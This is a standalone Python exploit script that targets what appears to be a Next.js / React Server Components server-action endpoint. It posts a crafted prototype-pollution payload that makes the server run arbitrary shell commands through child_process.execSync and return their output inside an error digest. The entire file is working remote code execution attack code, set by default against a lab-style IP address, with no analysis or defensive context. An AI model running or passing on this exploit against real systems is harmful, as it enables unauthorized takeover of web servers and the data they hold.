import requests
import sys
import json
import re

BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://10.129.18.51:3000"
EXECUTABLE = sys.argv[2] if len(sys.argv) > 2 else "id"

# Wrap command in shell for proper chaining (cd, &&, ;, |, etc.)
SHELL_CMD = f"/bin/sh -c \"{EXECUTABLE}\""

crafted_chunk = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then": "$B0"}',
    "_response": {
        "_prefix": f"""var res = process.mainModule.require('child_process').execSync(`{SHELL_CMD}`,{{'timeout':8000}}).toString().trim();
throw Object.assign(new Error('NEXT_REDIRECT'), {{digest: res }});""",
        "_formData": {
            "get": "$1:constructor:constructor",
        },
    },
}

files = {
    "0": (None, json.dumps(crafted_chunk)),
    "1": (None, '"$@0"'),
}

headers = {"Next-Action": "x"}

print(f"[+] Targeting → {BASE_URL}")
print(f"[+] Executing → {EXECUTABLE}\n")

res = requests.post(BASE_URL, files=files, headers=headers, timeout=20)

print(f"[+] HTTP Status: {res.status_code}")

# Extract and clean output
output = None
match = re.search(r'E\{[^}]*"digest"[^}]*:\s*["\']?([^"\']+?)["\']?\s*\}', res.text, re.IGNORECASE | re.DOTALL)
if match:
    output = match.group(1).strip()
elif not output:
    match = re.search(r'digest["\']?\s*:\s*["\']?([^"\']{1,6000})["\']?', res.text, re.IGNORECASE | re.DOTALL)
    if match:
        output = match.group(1).strip()

if output:
    output = output.replace('\\n', '\n').replace('\\r', '\n').strip()
    
    print("\n" + "="*75)
    print("✅ COMMAND OUTPUT")
    print("="*75)
    print(output)
    print("="*75)
else:
    print("[-] No output found.")
    print(res.text[:1200])